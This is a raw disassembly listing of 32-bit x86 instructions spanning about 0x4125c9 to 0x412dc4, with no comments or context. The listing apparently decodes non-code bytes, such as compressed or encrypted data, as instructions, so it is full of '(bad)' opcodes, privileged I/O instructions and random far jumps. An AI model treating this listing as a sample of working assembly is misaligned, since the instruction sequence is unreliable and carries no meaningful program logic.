  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0x90ad7a6a
  4125d0:	jne    0x41255e
  4125d2:	sbb    BYTE PTR [ebx+0x7b],dh
  4125d5:	jnp    0x412588
  4125d7:	pushf  
  4125d8:	jnp    0x412655
  4125da:	sbb    bh,BYTE PTR [edx+eax*4-0x1263bccb]
  4125e1:	jmp    0x4616:0xbccfd583
  4125e8:	mov    edi,0x12b7a273
  4125ed:	fidiv  WORD PTR [ebp-0xa]
  4125f0:	adc    eax,0x4a61f845
  4125f5:	pop    es
  4125f6:	xchg   ebx,eax
  4125f7:	add    BYTE PTR [edx-0x47],0xdf
  4125fb:	add    al,0x4e
  4125fd:	inc    ebp
  4125fe:	je     0x4125e8
  412600:	stos   BYTE PTR es:[edi],al
  412601:	and    al,0xb5
  412603:	jmp    0x6e81:0x70ed9d40
  41260a:	inc    esp
  41260b:	iret   
  41260c:	lea    esp,[eax-0xf]
  41260f:	sbb    al,0x74
  412611:	int    0x80
  412613:	pop    es
  412614:	es jbe 0x412678
  412617:	stc    
  412618:	(bad)  
  412619:	jmp    0x4d4faa05
  41261e:	in     eax,0x5
  412620:	jp     0x4125ee
  412622:	xchg   BYTE PTR [ecx+ebp*4+0x1e99d57b],cl
  412629:	mov    cl,0xb8
  41262b:	adc    DWORD PTR [edi],edx
  41262d:	sahf   
  41262e:	pushf  
  41262f:	fdiv   st,st(0)
  412631:	or     BYTE PTR [ebx+ecx*4],ah
  412634:	and    eax,0x675dede7
  412639:	std    
  41263a:	jecxz  0x41260f
  41263c:	popa   
  41263d:	inc    esi
  41263e:	pop    es
  41263f:	push   edx
  412640:	mov    ecx,0x7e474816
  412645:	leave  
  412646:	push   edi
  412647:	outs   dx,BYTE PTR ds:[esi]
  412648:	adc    BYTE PTR [edx],dh
  41264a:	mov    esp,0x17d2ad82
  41264f:	cs in  eax,dx
  412651:	(bad)  
  412652:	jnp    0x41262d
  412654:	and    bh,0x9f
  412657:	mov    esi,0x7543fb78
  41265c:	icebp  
  41265d:	in     eax,0xdd
  41265f:	setge  BYTE PTR [ecx+0x2b6b6e32]
  412666:	pusha  
  412667:	sbb    al,0x30
  412669:	ret    0xb5d2
  41266c:	push   0x6cb88aa0
  412671:	fcmovu st,st(7)
  412673:	out    dx,eax
  412674:	pop    ds
  412675:	inc    edx
  412676:	jge    0x412636
  412678:	dec    ebp
  412679:	pop    edi
  41267a:	xchg   ebx,eax
  41267b:	pusha  
  41267c:	out    dx,al
  41267d:	fdiv   st,st(0)
  41267f:	push   esp
  412680:	cld    
  412681:	push   0x3b
  412683:	and    al,0x5b
  412686:	ins    DWORD PTR es:[edi],dx
  412687:	(bad)  
  412688:	iret   
  412689:	dec    edx
  41268a:	xor    DWORD PTR [edi],eax
  41268c:	imul   edx,ebx,0x18e45aaa
  412692:	js     0x412667
  412694:	jmp    0x9081:0x209def7c
  41269b:	cmc    
  41269c:	pop    eax
  41269d:	cmp    al,0xcd
  41269f:	data16 sub BYTE PTR [ecx-0x16],bh
  4126a3:	mov    ds:0x9d1e2fc1,al
  4126a8:	lea    ebx,[edx-0x5d306c9b]
  4126ae:	fidivr WORD PTR [edx+edi*2+0x3dc9a425]
  4126b5:	push   ss
  4126b6:	lahf   
  4126b7:	fwait
  4126b8:	cli    
  4126b9:	xchg   ecx,eax
  4126ba:	ins    BYTE PTR es:[edi],dx
  4126bb:	lea    ebp,[edx]
  4126bd:	test   al,0xae
  4126bf:	adc    BYTE PTR [eax+ebp*4],bl
  4126c2:	cmp    edi,DWORD PTR [ebx+0x566a09a9]
  4126c8:	(bad)  
  4126c9:	mov    ch,0xa4
  4126cb:	(bad)  
  4126cc:	call   0x11d2f6c3
  4126d1:	pop    ebx
  4126d2:	cs fs hlt 
  4126d5:	inc    edx
  4126d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d7:	xchg   edx,eax
  4126d8:	outs   dx,DWORD PTR ds:[esi]
  4126d9:	mov    DWORD PTR ds:0x1028738c,0xabfb2e61
  4126e3:	test   DWORD PTR [esi+0x5d2fac8a],ebp
  4126e9:	stc    
  4126ea:	jp     0x4126f6
  4126ec:	rol    BYTE PTR [edi+0x27ff9c5],cl
  4126f2:	push   0xac13e4c5
  4126f7:	sbb    ah,bh
  4126f9:	mov    bh,0x47
  4126fb:	std    
  4126fc:	jg     0x412753
  4126fe:	aad    0xe1
  412700:	shl    DWORD PTR [esi-0x57],0x93
  412704:	mov    al,ds:0xc6d4ef9d
  412709:	pop    eax
  41270a:	and    ah,BYTE PTR [eax]
  41270c:	dec    eax
  41270d:	out    0xa2,al
  41270f:	ror    DWORD PTR [eax+0x6fe8911c],cl
  412715:	inc    ecx
  412716:	js     0x4126c4
  412718:	mov    ah,0x37
  41271a:	mov    edi,0xfc30c6b5
  41271f:	std    
  412720:	sahf   
  412721:	jb     0x412702
  412723:	jns    0x412707
  412725:	scas   eax,DWORD PTR es:[edi]
  412726:	sar    esp,0xf3
  412729:	shl    BYTE PTR [eax],0x2c
  41272c:	fmul   st,st(0)
  41272e:	jnp    0x4126f5
  412730:	cmc    
  412731:	aas    
  412732:	or     eax,edx
  412734:	dec    esi
  412735:	rcl    BYTE PTR [ebx-0x45],1
  412738:	mov    ah,0xe6
  41273a:	outs   dx,BYTE PTR ds:[esi]
  41273b:	das    
  41273c:	add    eax,0x6c2898d4
  412741:	retf   0x60b3
  412744:	jae    0x41278c
  412746:	(bad)  
  412747:	pop    ds
  412748:	arpl   WORD PTR ds:0xc4a405db,cx
  41274e:	imul   edi,DWORD PTR [ecx-0x1cb9233d],0xfffffff5
  412755:	test   al,0xa5
  412757:	in     al,0xb4
  412759:	xchg   ebx,eax
  41275a:	ret    0x83a7
  41275d:	ss retf 0x508b
  412761:	mov    al,0xc4
  412763:	shr    BYTE PTR [eax+0x16],cl
  412766:	mov    bh,0x34
  412768:	nop
  412769:	loop   0x4127c1
  41276b:	push   cs
  41276c:	sub    al,BYTE PTR [ecx]
  41276e:	pop    esi
  412770:	ja     0x4127ba
  412772:	xchg   esp,eax
  412773:	loope  0x412707
  412775:	mov    ah,0x45
  412777:	dec    ebx
  412778:	mov    dl,0xdc
  41277a:	or     al,0xfe
  41277c:	ret    
  41277d:	hlt    
  41277e:	test   DWORD PTR [edi+0x3182f11],esi
  412784:	fs scas al,BYTE PTR es:[edi]
  412786:	cdq    
  412787:	mov    ebp,DWORD PTR [ebx+0x1cf3241f]
  41278d:	fidiv  WORD PTR [ebp-0x416069af]
  412793:	test   BYTE PTR [edi-0x6983ce77],dl
  412799:	popa   
  41279a:	mov    BYTE PTR ss:[ebp-0x67b6e830],ch
  4127a1:	xchg   BYTE PTR [edx],bl
  4127a3:	hlt    
  4127a4:	dec    ebp
  4127a5:	dec    esi
  4127a6:	mov    esi,0x1973c65f
  4127ab:	sub    BYTE PTR [ecx+0x32b7944],dl
  4127b1:	mov    edx,0x286708c
  4127b6:	cmp    bh,BYTE PTR [edx]
  4127b8:	retf   
  4127b9:	call   0xa557:0x5068fdf4
  4127c0:	ret    0xf55d
  4127c3:	xchg   esi,eax
  4127c4:	cmp    eax,ebx
  4127c6:	in     al,0xa2
  4127c8:	out    0x95,eax
  4127ca:	or     DWORD PTR [ecx+0x69],ecx
  4127cd:	mov    bh,BYTE PTR [edi]
  4127cf:	pop    ds
  4127d0:	popa   
  4127d1:	pop    esi
  4127d2:	mov    bl,0xba
  4127d4:	sub    esp,esi
  4127d6:	lock push edi
  4127d8:	pop    ss
  4127d9:	das    
  4127da:	push   es
  4127db:	add    eax,0x3ae2a277
  4127e0:	call   0x3202:0xe798b9fb
  4127e7:	cmp    BYTE PTR [edi+0x86a2584],ah
  4127ed:	clc    
  4127ee:	pop    esp
  4127ef:	inc    ecx
  4127f0:	push   ss
  4127f1:	adc    eax,0xf652c273
  4127f6:	and    DWORD PTR [eax],edx
  4127f8:	and    dh,bh
  4127fa:	push   0xffffffd6
  4127fc:	fnstcw WORD PTR [ecx+0x3dd67f9e]
  412802:	(bad)
  412805:	lahf   
  412806:	clc    
  412807:	stc    
  412808:	mov    gs,WORD PTR [ebp+eiz*4-0x629d16ef]
  41280f:	out    dx,al
  412810:	jnp    0x412816
  412812:	std    
  412813:	push   ebx
  412814:	pop    es
  412815:	push   edi
  412816:	sar    DWORD PTR ds:0x8b3c9e9,0x95
  41281d:	div    DWORD PTR [edi-0x288d8564]
  412823:	scas   eax,DWORD PTR es:[edi]
  412824:	fst    DWORD PTR [edi-0x65498806]
  41282a:	inc    edx
  41282b:	test   al,0x78
  41282d:	pop    ebp
  41282e:	inc    ecx
  41282f:	or     al,0xd9
  412831:	sub    eax,0x5eadf8c
  412836:	daa    
  412837:	sbb    ebp,edi
  412839:	mov    bl,0x2
  41283b:	scas   eax,DWORD PTR es:[edi]
  41283c:	dec    esi
  41283d:	mov    ebp,0x79abaff6
  412842:	push   0xaad9bf6e
  412847:	call   esi
  412849:	leave  
  41284a:	sbb    BYTE PTR [esi+0x55],bh
  41284d:	dec    eax
  41284e:	or     eax,0x6459a658
  412853:	ins    BYTE PTR es:[edi],dx
  412854:	or     esp,DWORD PTR [edi-0x1b]
  412857:	btc    DWORD PTR [esi+0x117b2f47],0x6c
  41285f:	icebp  
  412860:	popa   
  412861:	mov    gs,WORD PTR [ecx]
  412863:	fadd   st,st(2)
  412865:	and    al,0x83
  412867:	adc    dh,BYTE PTR [edx]
  412869:	dec    edx
  41286a:	cmp    eax,DWORD PTR [eax-0x19]
  41286d:	loopne 0x4128e2
  41286f:	xor    eax,esp
  412871:	pop    ebp
  412872:	push   esi
  412873:	add    esp,DWORD PTR [ecx]
  412875:	jno    0x412816
  412877:	je     0x4128d6
  412879:	retf   
  41287a:	fld    TBYTE PTR [edi]
  41287c:	out    dx,al
  41287d:	inc    ebp
  41287e:	pop    esp
  41287f:	cmp    al,0x52
  412881:	sbb    al,0xe5
  412883:	or     ch,BYTE PTR [esi]
  412885:	jo     0x41288d
  412887:	dec    ecx
  412888:	(bad)  
  412889:	lahf   
  41288a:	adc    al,0x6d
  41288c:	daa    
  41288d:	mov    eax,ds:0xb396f51e
  412892:	mov    ebp,0x4d46d6ea
  412897:	pop    esi
  412898:	stos   DWORD PTR es:[edi],eax
  412899:	out    dx,al
  41289a:	push   ss
  41289b:	inc    eax
  41289c:	cdq    
  41289d:	sbb    bh,BYTE PTR [eax+0x5df1ffb9]
  4128a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128a4:	adc    eax,0x8b3161d6
  4128a9:	xchg   esp,eax
  4128aa:	lds    esp,FWORD PTR [edx]
  4128ac:	pop    es
  4128ad:	popa   
  4128ae:	call   0x15891d21
  4128b3:	cli    
  4128b4:	push   ecx
  4128b5:	in     eax,dx
  4128b6:	xor    esp,DWORD PTR [eax+0x576ff1f4]
  4128bc:	xchg   edi,eax
  4128bd:	or     al,0x4e
  4128bf:	xchg   esi,eax
  4128c0:	dec    ecx
  4128c1:	jno    0x4128fb
  4128c3:	adc    BYTE PTR [esi+0x8],bh
  4128c6:	hlt    
  4128c7:	sbb    BYTE PTR [edx],ah
  4128c9:	(bad)  [esi+0x42]
  4128cc:	inc    edi
  4128cd:	cwde   
  4128ce:	jbe    0x412919
  4128d0:	outs   dx,DWORD PTR ds:[esi]
  4128d1:	ret    
  4128d2:	xchg   esp,eax
  4128d3:	cs pop edi
  4128d5:	int    0x29
  4128d7:	loop   0x412895
  4128d9:	loopne 0x41289f
  4128db:	hlt    
  4128dc:	sar    DWORD PTR ds:0x2a527087,1
  4128e2:	push   ebp
  4128e3:	pop    edi
  4128e4:	out    0x51,eax
  4128e6:	and    dh,BYTE PTR [edi+0x525311d7]
  4128ec:	add    edi,eax
  4128ee:	inc    esp
  4128ef:	aad    0xe5
  4128f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128f2:	jge    0x4128d7
  4128f4:	outs   dx,DWORD PTR ds:[esi]
  4128f5:	push   esp
  4128f6:	repz jmp 0xe0bc46a9
  4128fc:	mov    edi,DWORD PTR [edx+0x44fc25f2]
  412902:	mov    esp,0x28f31c37
  412907:	aam    0x55
  412909:	je     0x412963
  41290b:	mov    eax,ds:0xf23534a4
  412910:	ja     0x41290d
  412912:	add    edx,edx
  412914:	mov    edi,0xb9f43d4a
  412919:	jb     0x4128bc
  41291b:	push   ebx
  41291c:	hlt    
  41291d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41291e:	or     esi,esp
  412920:	cdq    
  412921:	cmp    eax,0xb5b9e7eb
  412926:	ret    
  412927:	jne    0x41296c
  412929:	je     0x412902
  41292b:	xor    DWORD PTR [edi],ebx
  41292d:	dec    ebp
  41292e:	fdiv   QWORD PTR [ebp+0x5c]
  412931:	adc    BYTE PTR ds:0x3e928ada,0x54
  412938:	(bad)  
  412939:	push   cx
  41293b:	call   0x93c6:0xad58024f
  412942:	popf   
  412943:	xlat   BYTE PTR ds:[ebx]
  412944:	push   cs
  412945:	xchg   ebp,eax
  412946:	in     eax,dx
  412947:	inc    esp
  412948:	ficom  DWORD PTR [edi]
  41294a:	adc    al,0x94
  41294c:	jo     0x4129c1
  41294e:	jmp    0x8af4:0xf5b033f0
  412955:	fwait
  412956:	cli    
  412957:	inc    eax
  412958:	or     dl,ah
  41295a:	xchg   ebx,eax
  41295b:	and    BYTE PTR [eax+0x286a15da],dh
  412961:	lock add al,0x3c
  412964:	and    BYTE PTR [ebx],bh
  412966:	mov    eax,ds:0xba4ee824
  41296b:	(bad)  
  41296c:	shr    DWORD PTR [ebp-0x1fd02cd4],cl
  412972:	in     eax,dx
  412973:	jecxz  0x412979
  412975:	lods   al,BYTE PTR ds:[esi]
  412976:	call   0x97aa:0xc9a8e657
  41297d:	add    eax,0x3d305893
  412982:	push   esi
  412983:	jbe    0x4129ef
  412985:	out    dx,al
  412986:	(bad)  
  412987:	mov    esp,0x6c148f61
  41298c:	int3   
  41298d:	adc    eax,0x9c7c19e9
  412992:	out    dx,al
  412993:	mov    BYTE PTR [ebp+eiz*2-0x37],bl
  412997:	xor    BYTE PTR [ebx-0x51],0xe8
  41299b:	mov    esp,0x80e1f14d
  4129a0:	fsin   
  4129a2:	imul   ebp,ecx,0xbf8e6958
  4129a8:	or     DWORD PTR [edi-0x6b73671b],esp
  4129ae:	arpl   dx,bx
  4129b0:	jae    0x412987
  4129b2:	pop    ecx
  4129b3:	pushf  
  4129b4:	popa   
  4129b5:	jp     0x4129ac
  4129b7:	test   DWORD PTR [ecx+0xc],edi
  4129ba:	pop    esi
  4129bb:	sub    ebp,DWORD PTR [ecx]
  4129bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129be:	cs pop ebp
  4129c0:	and    edx,DWORD PTR [edi*1-0x6f900dba]
  4129c7:	inc    esi
  4129c8:	or     eax,0x7304cc3f
  4129cd:	shl    esi,0x19
  4129d0:	add    DWORD PTR [esi],ebp
  4129d2:	push   0x72
  4129d4:	or     bh,BYTE PTR es:[eax+0x6b5ec199]
  4129db:	jmp    0x4c2c2ee9
  4129e0:	shl    BYTE PTR [ecx],cl
  4129e2:	sbb    eax,0x12cee138
  4129e7:	test   eax,0xc400b71f
  4129ec:	rcr    DWORD PTR [ecx-0x13c3a2a6],1
  4129f2:	loopne 0x412983
  4129f4:	cmp    esi,DWORD PTR [eax+0x5d]
  4129f7:	mul    BYTE PTR [ebx-0xc]
  4129fa:	push   cs
  4129fb:	shr    BYTE PTR [ecx+0x787bc0d7],0x1d
  412a02:	cmp    BYTE PTR [edi+0x3d4d363b],bh
  412a08:	inc    ebp
  412a09:	mov    dl,0x95
  412a0b:	popf   
  412a0c:	adc    eax,ecx
  412a0e:	dec    esi
  412a0f:	nop
  412a10:	jbe    0x41299f
  412a12:	jns    0x4129dc
  412a14:	push   edi
  412a15:	or     dl,BYTE PTR [esi+eax*4]
  412a18:	adc    esp,eax
  412a1a:	xchg   DWORD PTR [ebp+ecx*2-0x6a],esp
  412a1e:	outs   dx,BYTE PTR fs:[esi]
  412a20:	xor    esp,esp
  412a22:	cmp    al,0x6c
  412a24:	ret    
  412a25:	int    0x5f
  412a27:	or     eax,0x3cfdba4d
  412a2c:	mov    eax,gs:0xce0163fd
  412a32:	xchg   ebp,eax
  412a33:	imul   edx,DWORD PTR [eax-0x6077a9a8],0xcdbafeef
  412a3d:	test   al,0x9d
  412a3f:	adc    al,0xc1
  412a41:	ret    0xc6b3
  412a44:	sub    al,0xff
  412a46:	outs   dx,BYTE PTR ds:[esi]
  412a47:	mov    bh,0x83
  412a49:	inc    edx
  412a4a:	gs dec ecx
  412a4c:	cmp    al,0x6
  412a4e:	adc    al,0xa4
  412a50:	sbb    eax,0xbcb34e95
  412a55:	xchg   BYTE PTR [ecx+0x363adc77],cl
  412a5b:	adc    eax,0x32af2606
  412a60:	inc    ebx
  412a61:	xchg   esi,eax
  412a62:	in     al,0x9b
  412a64:	ror    esi,0x9c
  412a67:	xor    BYTE PTR [edi],dl
  412a69:	mov    eax,ds:0x320209f3
  412a6e:	adc    bl,dh
  412a70:	pop    eax
  412a71:	fdivp  st(5),st
  412a73:	adc    dl,bh
  412a75:	push   0x6160fa66
  412a7a:	pop    ebx
  412a7b:	push   eax
  412a7c:	je     0x412a30
  412a7e:	cmp    eax,0x159001a1
  412a83:	or     edx,ebx
  412a85:	cmp    al,0xd
  412a87:	or     ah,al
  412a89:	in     eax,0x8a
  412a8b:	mov    ch,0x5a
  412a8d:	inc    ecx
  412a8e:	imul   edx,DWORD PTR [edx-0x7311530f],0xfd1f4791
  412a98:	xchg   edx,eax
  412a99:	aaa    
  412a9a:	call   0xb831dada
  412a9f:	sub    BYTE PTR [ebx+0x61d63042],al
  412aa5:	stc    
  412aa6:	fcom   DWORD PTR [ecx+edx*8+0x69]
  412aaa:	loope  0x412aa0
  412aac:	and    al,BYTE PTR ds:0xbb464233
  412ab2:	fcmovnb st,st(5)
  412ab4:	push   ds
  412ab5:	push   esp
  412ab6:	add    al,dl
  412ab8:	mov    edi,0xc0174d3
  412abd:	dec    edi
  412abe:	loope  0x412a4a
  412ac0:	(bad)  
  412ac2:	add    al,0x33
  412ac4:	dec    ebp
  412ac5:	sar    BYTE PTR [esi-0x1b],0x7a
  412ac9:	aas    
  412aca:	lds    edi,FWORD PTR [ecx]
  412acc:	inc    esi
  412acd:	ins    DWORD PTR es:[edi],dx
  412ace:	js     0x412b2b
  412ad0:	sub    eax,edx
  412ad2:	dec    esi
  412ad3:	mov    eax,0xe9d419d3
  412ad8:	shl    BYTE PTR [esi],0x32
  412adb:	lds    ebp,FWORD PTR [ecx-0x62]
  412ade:	hlt    
  412adf:	pop    esi
  412ae0:	jmp    0x412b1c
  412ae2:	push   es
  412ae3:	mov    al,0x2c
  412ae5:	loope  0x412b0b
  412ae7:	imul   ecx,DWORD PTR [ecx+0x49],0x6b
  412aeb:	xlat   BYTE PTR ds:[ebx]
  412aec:	shl    DWORD PTR [ebx+edx*1+0x2d79c1a3],cl
  412af3:	leave  
  412af4:	aas    
  412af5:	or     dl,dl
  412af7:	xchg   DWORD PTR [edx*1-0x3e376fa2],ebp
  412afe:	mov    ebp,0x291b6a85
  412b03:	adc    al,0x4f
  412b05:	xchg   ebx,eax
  412b06:	lahf   
  412b07:	outs   dx,BYTE PTR ds:[esi]
  412b08:	imul   ecx,DWORD PTR [edi-0x21],0x2801bedb
  412b0f:	cld    
  412b10:	sar    DWORD PTR [ebx-0x594b6a82],cl
  412b16:	adc    eax,0x1a822f4
  412b1b:	das    
  412b1c:	push   esi
  412b1d:	xchg   esp,eax
  412b1e:	add    al,0x4e
  412b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b21:	ret    
  412b22:	mov    BYTE PTR [ebx],bh
  412b24:	mov    ds:0x41122f61,eax
  412b29:	repnz sbb al,0xa3
  412b2c:	das    
  412b2d:	sbb    al,0x9
  412b2f:	inc    ebx
  412b30:	xchg   edx,eax
  412b31:	popa   
  412b32:	dec    edi
  412b33:	call   0xe93f1993
  412b38:	call   0x91da2686
  412b3d:	inc    eax
  412b3e:	test   BYTE PTR [eax+edx*8-0x2d3efa7],dh
  412b45:	and    al,0x40
  412b47:	push   edi
  412b48:	sbb    DWORD PTR [edx+eiz*1-0x38],0xe63fcb14
  412b50:	jmp    0x412b2e
  412b52:	jmp    0x3425:0x7521e4e4
  412b59:	add    dl,al
  412b5b:	xchg   edx,eax
  412b5c:	mov    esp,0xb5d3911f
  412b61:	push   ds
  412b62:	sub    DWORD PTR [eax],0x89048f2a
  412b68:	xchg   ecx,eax
  412b69:	pop    edx
  412b6a:	loop   0x412b04
  412b6c:	adc    al,0x89
  412b6e:	sub    BYTE PTR [edi+ebp*4],0x91
  412b72:	mov    ebx,0x78c8d049
  412b77:	test   al,0x2a
  412b79:	mov    edi,0x2ef45d47
  412b7e:	pusha  
  412b7f:	das    
  412b80:	xchg   esp,eax
  412b81:	jl     0x412b04
  412b83:	xor    ecx,0x2bb78c81
  412b89:	ins    DWORD PTR es:[edi],dx
  412b8a:	add    eax,0xc5321a9c
  412b8f:	call   0xc2b6:0xdc672e7
  412b96:	mov    cl,0x12
  412b98:	or     eax,0xaf9c3eb
  412b9d:	or     BYTE PTR [edx+esi*8],al
  412ba0:	cs push cs
  412ba2:	push   eax
  412ba3:	arpl   si,cx
  412ba5:	mov    eax,0x107665f6
  412baa:	fs jb  0x412b5f
  412bad:	and    BYTE PTR ds:0x6d0f61c5,bl
  412bb3:	xchg   esi,eax
  412bb4:	les    ecx,FWORD PTR [ebp-0x54643528]
  412bba:	call   0x64c0ba1
  412bbf:	push   ebp
  412bc0:	inc    esi
  412bc1:	das    
  412bc2:	pop    ss
  412bc3:	mov    al,ds:0x8318861
  412bc8:	sbb    al,0x20
  412bca:	and    ebp,edx
  412bcc:	or     DWORD PTR [ebx+ebx*2],ecx
  412bcf:	shl    DWORD PTR [edi+0x7d],0x88
  412bd3:	adc    BYTE PTR [edx],cl
  412bd5:	push   cs
  412bd6:	jp     0x412b7a
  412bd8:	jmp    0x834e:0x3668de32
  412bdf:	jae    0x412b98
  412be1:	enter  0xe311,0x60
  412be5:	std    
  412be6:	add    cl,BYTE PTR [ebx-0x3]
  412be9:	rcl    DWORD PTR [esi-0x57],0x9b
  412bed:	mov    ebx,0x8076d01b
  412bf2:	shl    DWORD PTR [esi],0xe
  412bf5:	jo     0x412c1b
  412bf7:	enter  0x9378,0xa7
  412bfb:	jle    0x412c02
  412bfd:	jae    0x412bae
  412bff:	adc    eax,0xe5c1e90d
  412c04:	(bad)  
  412c05:	loop   0x412c56
  412c07:	pop    esp
  412c08:	clc    
  412c09:	mov    edi,0x19315ef8
  412c0e:	fsub   DWORD PTR [esi+0xa]
  412c11:	jno    0x412c32
  412c13:	pop    edx
  412c14:	outs   dx,BYTE PTR ds:[esi]
  412c15:	outs   dx,BYTE PTR ds:[esi]
  412c16:	jle    0x412c90
  412c18:	pop    ds
  412c19:	xor    al,BYTE PTR [eax]
  412c1b:	mov    dh,0xce
  412c1d:	push   edi
  412c1e:	retf   0xdfd
  412c21:	and    al,0xb
  412c23:	popa   
  412c24:	les    edx,FWORD PTR [edx]
  412c26:	add    eax,0xbfa6d64a
  412c2b:	push   esp
  412c2c:	cwde   
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	cld    
  412c2f:	sahf   
  412c30:	mov    al,ds:0xe2e81109
  412c35:	hlt    
  412c36:	sbb    BYTE PTR [edi],ah
  412c38:	retf   0xfcf8
  412c3b:	cmp    eax,0x98afcc8c
  412c40:	inc    esi
  412c41:	inc    ebx
  412c42:	je     0x412c24
  412c44:	jmp    0x9b2c:0x57e08990
  412c4b:	push   0x43
  412c4d:	push   cs
  412c4e:	sbb    BYTE PTR [eax-0x38],ah
  412c51:	pop    ebp
  412c52:	add    eax,0xb2f69187
  412c57:	lods   eax,DWORD PTR ds:[esi]
  412c58:	mov    BYTE PTR [edx],0xa4
  412c5b:	pcmpeqd mm2,QWORD PTR [ebx]
  412c5e:	icebp  
  412c5f:	pop    ecx
  412c60:	mov    al,ds:0xad139ed1
  412c65:	(bad)  
  412c66:	outs   dx,DWORD PTR ds:[esi]
  412c67:	dec    eax
  412c68:	adc    ebx,esi
  412c6a:	jae    0x412c24
  412c6c:	dec    ebp
  412c6d:	xchg   BYTE PTR [eax-0x5ed807a2],cl
  412c73:	out    0xbd,eax
  412c75:	inc    eax
  412c76:	push   ebp
  412c77:	sbb    ah,BYTE PTR [ebp+0x14]
  412c7a:	pop    ss
  412c7b:	jb     0x412c65
  412c7d:	inc    edi
  412c7e:	(bad)  
  412c7f:	pushf  
  412c80:	mov    al,ds:0x94ee2287
  412c85:	mov    eax,ds:0x960846d2
  412c8a:	adc    BYTE PTR [esi-0x5ac01f55],dl
  412c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c91:	test   al,0xce
  412c93:	xor    ecx,ecx
  412c95:	retf   
  412c96:	xchg   edi,eax
  412c97:	les    esi,FWORD PTR [eax+0x27]
  412c9a:	dec    esp
  412c9b:	push   cs
  412c9c:	enter  0xd33,0xd6
  412ca0:	mov    al,ds:0x695ff597
  412ca5:	and    ebp,DWORD PTR [ebp+0x70]
  412ca8:	pop    ds
  412ca9:	pop    es
  412caa:	mov    ecx,0x719464c0
  412caf:	mov    eax,0xf7cd073b
  412cb4:	jae    0x412ca7
  412cb6:	xchg   edi,eax
  412cb7:	test   cl,ch
  412cb9:	outs   dx,BYTE PTR ds:[esi]
  412cba:	add    dh,BYTE PTR [esi]
  412cbc:	sub    edx,DWORD PTR [ecx-0x10953dcf]
  412cc2:	push   esp
  412cc3:	mov    ah,0xea
  412cc5:	xchg   ebp,eax
  412cc6:	jmp    0x3a89:0x9af2a450
  412ccd:	(bad)  
  412cce:	out    0x2a,eax
  412cd0:	mov    dh,0x60
  412cd2:	push   DWORD PTR [edx-0x6c]
  412cd5:	bound  edi,QWORD PTR [edi]
  412cd7:	imul   ebp,esi,0xffffffd0
  412cda:	in     al,dx
  412cdb:	mov    ch,0xb7
  412cdd:	(bad)  
  412cde:	push   ss
  412cdf:	sub    ebp,DWORD PTR [ebx+0x1a6f9de1]
  412ce5:	gs scas eax,DWORD PTR es:[edi]
  412ce7:	outs   dx,DWORD PTR ds:[esi]
  412ce8:	fld    TBYTE PTR [ecx-0x12]
  412ceb:	outs   dx,DWORD PTR ds:[esi]
  412cec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ced:	and    esi,ebx
  412cef:	xor    eax,0x763df4ec
  412cf4:	xor    eax,0x95900b1e
  412cf9:	inc    BYTE PTR [eax+0xd77f219]
  412cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d00:	mov    eax,es
  412d02:	pusha  
  412d03:	add    DWORD PTR [esi],ebx
  412d05:	into   
  412d06:	in     al,dx
  412d07:	aas    
  412d08:	cmc    
  412d09:	add    ebx,ebp
  412d0b:	sbb    DWORD PTR [edx],eax
  412d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d0e:	inc    ecx
  412d0f:	inc    edi
  412d10:	inc    esp
  412d11:	lods   al,BYTE PTR ds:[esi]
  412d12:	popa   
  412d13:	xor    BYTE PTR [edx+eax*2],cl
  412d16:	lea    ebp,[ebx]
  412d18:	inc    ebp
  412d19:	jmp    0x2d17:0x6edbd3ef
  412d20:	pop    esi
  412d21:	jle    0x412cec
  412d23:	out    dx,al
  412d24:	fprem  
  412d26:	cmc    
  412d27:	jmp    0x8acb7f32
  412d2c:	fimul  DWORD PTR [ebx]
  412d2e:	push   cs
  412d2f:	sar    BYTE PTR ss:[edx+ebx*1+0x7877604a],1
  412d37:	(bad)  
  412d38:	xchg   esi,eax
  412d39:	(bad)
  412d3e:	ror    DWORD PTR [ebx-0x6293a6da],0x4b
  412d45:	lea    eax,[edi+edi*1]
  412d48:	enter  0x460e,0x5c
  412d4c:	loope  0x412d16
  412d4e:	adc    edx,eax
  412d50:	and    eax,0x2b35aac1
  412d55:	mov    ebx,0xeeef1372
  412d5a:	xchg   ebx,eax
  412d5b:	and    eax,0x73635fb1
  412d60:	sub    DWORD PTR [esi],eax
  412d62:	fild   WORD PTR [edx]
  412d64:	sub    edx,DWORD PTR [ecx+0x3d]
  412d67:	or     DWORD PTR [edi],ecx
  412d69:	xor    ecx,DWORD PTR [edx+0x31d7d28f]
  412d6f:	sbb    eax,0x22ce7d36
  412d74:	pop    ebp
  412d75:	int    0xe2
  412d77:	stc    
  412d78:	mov    dl,0x59
  412d7a:	jns    0x412de1
  412d7c:	nop
  412d7d:	mov    WORD PTR [eax],fs
  412d7f:	jp     0x412d28
  412d81:	dec    esp
  412d82:	paddsb mm7,QWORD PTR ds:0xe88513d2
  412d89:	xor    al,0x24
  412d8b:	push   es
  412d8c:	jg     0x412dc6
  412d8e:	dec    eax
  412d8f:	cld    
  412d90:	adc    BYTE PTR es:[edx+0x7],dh
  412d94:	xchg   esp,eax
  412d95:	stos   DWORD PTR es:[edi],eax
  412d96:	retf   
  412d97:	clc    
  412d98:	daa    
  412d99:	sbb    BYTE PTR [ecx+0x45ee9879],0xb8
  412da0:	sbb    al,0xcb
  412da2:	fidiv  DWORD PTR es:[esp+edx*8+0x1b]
  412da7:	stc    
  412da8:	jo     0x412d6a
  412daa:	mov    bl,0xb5
  412dac:	push   cs
  412dad:	(bad)  
  412daf:	and    BYTE PTR ds:0xf8702fe0,bh
  412db5:	push   cs
  412db6:	mov    bl,0xb6
  412db8:	test   eax,0xb111d6e2
  412dbd:	dec    ebx
  412dbe:	xor    DWORD PTR [eax],0xffffff95
  412dc1:	dec    ebp
  412dc2:	jae    0x412d7e
  412dc4:	gs sti 
